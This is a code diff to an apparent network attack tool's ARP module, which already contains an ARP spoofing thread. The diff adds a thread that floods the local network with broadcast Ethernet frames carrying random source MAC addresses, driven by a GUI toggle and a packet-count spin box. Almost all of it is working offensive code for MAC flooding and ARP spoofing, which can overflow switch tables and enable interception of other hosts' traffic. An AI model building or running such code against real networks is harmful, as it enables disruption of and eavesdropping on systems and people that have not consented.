@@ -46,10 +46,10 @@ import gtk.glade
 
 class spoof_thread(threading.Thread):
     def __init__(self, parent, delay):
+        threading.Thread.__init__(self)
         self.parent = parent
         self.delay = delay
         self.running = True
-        threading.Thread.__init__(self)
         self.reset = False
 
     def run(self):
@@ -82,6 +82,32 @@ class spoof_thread(threading.Thread):
     def quit(self):
         self.running = False
 
+class flood_thread(threading.Thread):
+    def __init__(self, parent, no):
+        threading.Thread.__init__(self)
+        self.parent = parent
+        self.no = no
+        self.running = True
+
+    def run(self):
+        self.parent.log("ARP: Flood thread started")
+        while self.running and self.no > 0:
+            if self.parent.dnet:
+                rand_mac = [ 0x00, random.randint(0x00, 0xff), random.randint(0x00, 0xff), random.randint(0x00, 0xff), random.randint(0x00, 0xff), random.randint(0x00, 0xff) ]
+                rand_mac = ':'.join(map(lambda x: "%02x" % x, rand_mac))
+                _eth = dpkt.ethernet.Ethernet(  dst=dnet.ETH_ADDR_BROADCAST,
+                                                src=dnet.eth_aton(rand_mac),
+                                                type=0x9000,
+                                                data="\x00\x00\x01\x00\x00\x00" + "\x00" * 40
+                                                )
+                self.parent.dnet.send(str(_eth))
+                self.no -= 1
+        self.parent.flood_togglebutton.set_active(False)
+        self.parent.log("ARP: Flood thread terminated")
+
+    def quit(self):
+        self.running = False
+
 class mod_class(object):
     def __init__(self, parent, platform):
         self.parent = parent
@@ -101,6 +127,7 @@ class mod_class(object):
     
     def start_mod(self):
         self.spoof_thread = spoof_thread(self, 30)
+        self.flood_thread = None
         self.hosts = {}
         self.upper_add = {}
         self.lower_add = {}
@@ -111,6 +138,8 @@ class mod_class(object):
     def shut_mod(self):
         if self.spoof_thread:
             self.spoof_thread.quit()
+        if self.flood_thread:
+            self.flood_thread.quit()
         self.hosts_liststore.clear()
         self.upper_add_liststore.clear()
         self.lower_add_liststore.clear()
@@ -232,6 +261,8 @@ class mod_class(object):
         self.mappings_treeview.append_column(column)
 
         self.scan_network_entry = self.glade_xml.get_widget("scan_network_entry")
+        self.flood_no_spinbutton = self.glade_xml.get_widget("flood_no_spinbutton")
+        self.flood_togglebutton = self.glade_xml.get_widget("flood_togglebutton")
 
         self.offline = self.hosts_treeview.render_icon(gtk.STOCK_NO, 1)
         self.online = self.hosts_treeview.render_icon(gtk.STOCK_YES, 1)
@@ -263,6 +294,8 @@ class mod_class(object):
     def input_eth(self, eth, timestamp):
         arp = dpkt.arp.ARP(str(eth.data))
         mac = dnet.eth_ntoa(str(eth.src))
+        if self.flood_thread and self.flood_thread.is_alive():
+            return
         if self.mac:
             if not eth.src == self.mac:
                 if arp.op == dpkt.arp.ARP_OP_REQUEST:
@@ -536,4 +569,10 @@ class mod_class(object):
             self.dnet.eth.send(str(eth))
 
     def on_flood_togglebutton_toggled(self, btn):
-        pass
+        if btn.get_active():
+            self.flood_thread = flood_thread(self, self.flood_no_spinbutton.get_value_as_int())
+            self.flood_thread.start()
+        else:                
+            if self.flood_thread and self.flood_thread.is_alive():
+                self.flood_thread.quit()
+                self.flood_thread = None
